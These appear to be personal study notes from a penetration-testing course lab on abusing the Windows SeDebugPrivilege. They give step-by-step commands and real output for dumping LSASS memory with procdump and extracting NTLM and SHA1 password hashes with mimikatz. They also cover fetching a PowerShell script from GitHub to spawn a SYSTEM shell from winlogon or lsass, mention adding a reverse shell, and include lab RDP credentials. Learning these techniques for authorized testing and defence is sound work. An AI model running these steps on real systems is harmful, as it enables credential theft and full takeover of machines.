# SeDebugPrivilege

To run a particular application or service or assist with troubleshooting, a user might be assigned the SeDebugPrivilege instead of adding the account into the administrators group.

This privilege can be assigned via local or domain group policy, under :
Computer Settings > Windows Settings > Security Settings

Suppose we are, for example, retrieving many NTLMv2 password hashes using Responder or Inveigh.

1) Enumerate privileges

```
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeDebugPrivilege                          Debug programs                                                     Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
```

2) Use procdump to leverage this privilege and dump process memory

https://docs.microsoft.com/en-us/sysinternals/downloads/procdump

```
procdump.exe -accepteula -ma lsass.exe lsass.dmp

ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[15:25:45] Dump 1 initiated: C:\Tools\Procdump\lsass.dmp
[15:25:45] Dump 1 writing: Estimated dump file size is 42 MB.
[15:25:45] Dump 1 complete: 43 MB written in 0.5 seconds
[15:25:46] Dump count reached.
```

3) Load dump this in Mimikatz using the sekurlsa::minidump command

After issuing the sekurlsa::logonPasswords commands, we gain the NTLM hash of the local administrator account logged on locally

mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.dmp' file for minidump...

Authentication Id : 0 ; 23196355 (00000000:0161f2c3)
Session           : Interactive from 4
User Name         : DWM-4
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/31/2021 3:00:57 PM
SID               : S-1-5-90-0-4
        msv :
        tspkg :
        wdigest :
         * Username : WINLPE-SRV01$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

<SNIP> 

Authentication Id : 0 ; 23026942 (00000000:015f5cfe)
Session           : RemoteInteractive from 2
User Name         : jordan
Domain            : WINLPE-SRV01
Logon Server      : WINLPE-SRV01
Logon Time        : 3/31/2021 2:59:52 PM
SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
        msv :
         [00000003] Primary
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * NTLM     : cf3a5525ee9414229e66279623ed5c58
         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
        tspkg :
        wdigest :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        kerberos :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        ssp :
        credman :

<SNIP>

--> we can also take a manual memory dump of the LSASS process via the Task Manager by browsing to the Details tab, choosing the LSASS process, and selecting Create dump file

## Remote Code Execution as SYSTEM

1) Transfer this script to the target

https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1

2) tasklist

winlogon.exe                   612 Console                    1     10,408 K

3) 

.\psgetsy.ps1 [MyProcess]::CreateProcessFromParent(612,C:\Windows\System32\cmd.exe,"")

OR 

.\psgetsy.ps1 [MyProcess]::CreateProcessFromParent((Get-Process "lsass").Id,C:\Windows\System32\cmd.exe,"")


Other script :
https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC

--> We would need to customize those scripts in a case we don't have any RDP access to the target (add a reverse shell for example)

--> SeDebugPrivilege is an intersting technique when LSASS dump don't result in any useful credentials

## LAB

xfreerdp /v:10.129.43.43 /u:htb-student /p:HTB_@cademy_stdnt!

whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled

cd c:\Tools

Procdump\procdump.exe -accepteula -ma lsass.exe lsass.dmp

ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

Error opening lsass.exe (696):
Access is denied. (0x00000005, 5)

Procdump\procdump.exe -accepteula -ma C:\Windows\System32\lsass.exe lsass.dmp

No process matching the specified name can be found.
Try elevating the command prompt or using PsExec to make one as SYSTEM.
        psexec.exe -s -d -i cmd.exe
        procdump.exe -accepteula ...

secpol.msc

--> Access Denied

xfreerdp /v:10.129.113.23 /u:jordan /p:HTB_@cademy_j0rdan!

whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeDebugPrivilege              Debug programs                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

cd c:\Tools

Procdump\procdump.exe -accepteula -ma lsass.exe lsass.dmp

ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[12:10:54] Dump 1 initiated: c:\Tools\lsass.dmp
[12:10:55] Dump 1 writing: Estimated dump file size is 42 MB.
[12:10:55] Dump 1 complete: 42 MB written in 0.8 seconds
[12:10:56] Dump count reached.

cd c:\Tools\Mimikatz\x64

mimikatz.exe

sekurlsa::minidump c:\Tools\lsass.dmp
Switch to MINIDUMP : 'c:\Tools\lsass.dmp'

mimikatz # sekurlsa::logonpasswords
Opening : 'c:\Tools\lsass.dmp' file for minidump...